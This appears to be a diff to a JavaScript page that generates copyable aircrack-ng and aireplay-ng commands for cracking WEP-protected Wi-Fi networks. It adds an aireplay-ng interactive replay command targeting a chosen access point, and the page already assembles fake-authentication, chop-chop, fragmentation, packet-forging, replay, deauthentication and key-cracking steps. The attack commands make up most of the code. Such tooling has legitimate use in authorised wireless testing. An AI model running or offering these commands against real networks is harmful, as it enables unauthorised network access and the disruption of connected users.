@@ -218,10 +218,11 @@ function myFunction() {
 		+ preamble() + setup() + postamble()
 		+ preamble() + monitorMode(deviceName, channel) + postamble()
 		+ preamble() + captureCommand(deviceName, channel, apMac)+ postamble() 
-		+ preamble() + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
-		+ preamble() + chopChopAttack(apMac, mac, deviceName) + copyButton() + "</td><td>" + fragmentationAttack(apMac, mac, deviceName) + postamble()   
-		+ preamble() + packetForge(apMac, mac, deviceName) + postamble() 
-		+ preamble() + replayAttack(deviceName) + postamble()               
+		+ '<tr><td colspan="3">' + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
+		+ preamble() + chopChopAttack(apMac, mac, deviceName) + copyButton() + "</td><td>" + fragmentationAttack(apMac, mac, deviceName)
+		 + copyButton() + "</td><td>" + replayAnyAttack(apMac, mac, deviceName) + postamble()   
+		+ '<tr><td colspan="2">' + packetForge(apMac, mac, deviceName) + postamble() 
+		+ '<tr><td colspan="2">' + replayAttack(deviceName) + postamble()               
 		+ preamble() + sudo() + "aircrack-ng `ls -t cap1*.cap | head -1`" + postamble()
 		+ "</table>";
 		
@@ -340,6 +341,10 @@ function deauthAttack(apMac, victimMac, device) {
 	} else {
 		return sudo() + `aireplay-ng -0 1 -a ${apMac} ${device}`
 	}
+}
+
+function replayAnyAttack(apMac, mac, device) {
+	return sudo() + `aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b ${apMac} -h ${mac} ${device}`
 }
 </script>
 <center>
